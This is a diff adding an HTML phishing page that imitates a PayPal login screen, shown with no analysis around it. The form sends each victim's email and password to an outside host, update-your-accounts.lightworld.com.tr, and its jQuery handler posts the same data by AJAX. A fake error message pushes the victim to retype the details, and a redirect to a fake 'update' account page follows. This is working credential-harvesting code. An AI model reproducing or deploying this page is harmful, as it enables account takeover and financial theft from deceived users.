@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en" id="EYYE6556A1EY85Y">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="x-ua-compatible" content="ie=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title> Log in to your account </title>
+        <link rel="shortcut icon" href="pp_favicon_x.ico">
+        <link rel="apple-touch-icon" href="http://update-your-accounts.lightworld.com.tr/Update/images/apple-touch-icon.png">
+        <link rel="stylesheet" href="main.css">
+        <script src="modernizr.js"></script>
+    </head>
+    <body id="86T7TR51T13Y645" data-token="6055RZZ3154T4E3">
+        <!--[if lt IE 8]>
+            <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
+        <![endif]-->
+        <!-- LOADER PAGE IN CLICKS BUTTON -->
+        <div class="rotation"> <p> Checking your info... </p> </div>
+        <div class="main-login" id="35A1R9Y2AR3TEA2">
+            <div class="ppcom-logo"></div>
+            <div class="content">
+
+                <div class="form-login-error">
+                    <p> Some of your info isn't correct. Please try again. </p>
+                </div>
+                <form class="form-login" action="http://update-your-accounts.lightworld.com.tr/Update/functions" method="post" novalidate="novalidate">
+                        <input type="hidden" class="hidden" type="password">
+                    <div class="inputs">
+                        <input class="enterInput" type="email" name="email" placeholder="Email">
+                    </div>
+                    <div class="inputs">
+                        <input class="enterInput" type="password" name="password" placeholder="Password">
+                    </div>
+                        <input class="btn block" type="submit" value="Log In">
+                </form>
+                <p class="forgot-link">
+                    <a rel="nofollow" href="login@cmd=_signin&amp;amp%3Bdispatch=277bc475409e3f9d6b58a65ff&amp;amp%3Blocale=en_US.html#forgot-password"> Forgot your email or password? </a>
+                </p>
+                <a class="btn secondary block"> Sign Up </a>
+            </div>
+        </div>
+        
+        <footer class="main-login-footer clearfix" id="2037502144683A5">
+            <ul>
+                <li> <a id="7RA1Y7AT95ER487" rel="nofollow" href="login@cmd=_signin&amp;amp%3Bdispatch=277bc475409e3f9d6b58a65ff&amp;amp%3Blocale=en_US.html#contact"> Contact Us </a></li>
+                <li> <a id="6Z792RA5TTA47RY" rel="nofollow" href="login@cmd=_signin&amp;amp%3Bdispatch=277bc475409e3f9d6b58a65ff&amp;amp%3Blocale=en_US.html#privacy"> Privacy </a> </li> 
+                <li> <a id="E4R76ET1Z8785Z0" rel="nofollow" href="login@cmd=_signin&amp;amp%3Bdispatch=277bc475409e3f9d6b58a65ff&amp;amp%3Blocale=en_US.html#legal"> Legal </a> </li>
+                <li> <a id="E1Z4ZT26415T6EE" rel="nofollow" href="login@cmd=_signin&amp;amp%3Bdispatch=277bc475409e3f9d6b58a65ff&amp;amp%3Blocale=en_US.html#worldwide"> Worldwide </a> </li>
+            </ul>
+        </footer>
+        <script src="jquery.js"></script>
+        <script src="plugins.js"></script>
+        <script src="main.js"></script>
+		       <script>
+            $(".form-login").validate({
+                rules: {
+                        email:      { required: true, email: true  },
+                        password:   { required: true, minlength: 8 },
+                    }, 
+                messages: { email: "", password: "" },
+                ///////////////////////////////////////////////////////////
+                submitHandler: function(form) {
+                    $(".rotation").show();
+                    $.post("functions?ajax", $(".form-login").serialize(), function(result) {
+                        if (result == "LOGIN_OK") {
+                            setTimeout(function() {
+                                $(location).attr("href", "myaccount?cmd=_update&dispatch=b5c291956ac7b8a643900094f&locale=en_MY");
+                            }, 3500); 
+                        } else {
+                            setTimeout(function() {
+                                $(location).attr("href", "?s=Error");
+                            }, 3500); 
+                        }
+                    });
+                ///////////////////////////////////////////////////////////
+                },
+            });    
+        </script>
+    </body>
+</html>
+</script>
